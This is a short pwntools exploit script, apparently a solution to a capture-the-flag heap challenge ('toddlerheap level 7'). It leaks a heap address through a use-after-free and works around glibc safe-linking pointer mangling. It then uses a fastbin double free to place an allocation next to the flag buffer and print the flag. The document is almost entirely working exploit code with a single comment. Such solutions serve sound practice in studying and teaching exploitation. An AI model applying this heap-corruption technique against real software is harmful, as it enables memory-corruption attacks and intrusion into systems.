from pwn import * 

binary = './toddlerheap_level7.0_patched'
p = process(binary)

s = '''
b malloc
b free
'''


p.recvuntil("Reading the flag into ")
target = int(p.recvuntil(".", drop = True).decode(), 16)

print(hex(target))




p.sendline("calloc 0 24")
p.sendline("calloc 1 24")

p.sendline("free 0")
p.sendline("free 1")

p.sendline("puts 0")



p.recvuntil("Data: ", drop = True)
heap_leak = int.from_bytes(p.recvline().strip(), 'little')

print(hex(heap_leak))


heap_leak = heap_leak << 12
chunk_addr = heap_leak + 0x370

print(hex(chunk_addr))





mangled_ptr = ((chunk_addr >> 12) ^ (target - 0x28))


for i in range(2,7):
	p.sendline(f"calloc {i} 24")
for i in range(2,7):
	p.sendline(f"free {i}")

# fastbin dup 

p.sendline(f"calloc 7 24")
p.sendline(f"calloc 8 24")
p.sendline(f"free 7")
p.sendline(f"free 8")
p.sendline(f"free 7")


p.sendline(f"calloc 7 24")
p.sendline(f"calloc 8 24")


p.sendline("calloc 10 33")
p.sendline("safer_read 7")
p.sendline(p64(mangled_ptr))




p.sendline(f"calloc 9 24")
p.sendline(f"calloc 10 24")



p.sendline("safer_read 10")
p.send(b"A" * 0x18)
#gdb.attach(p, s)
p.sendline("puts 10")







p.interactive()
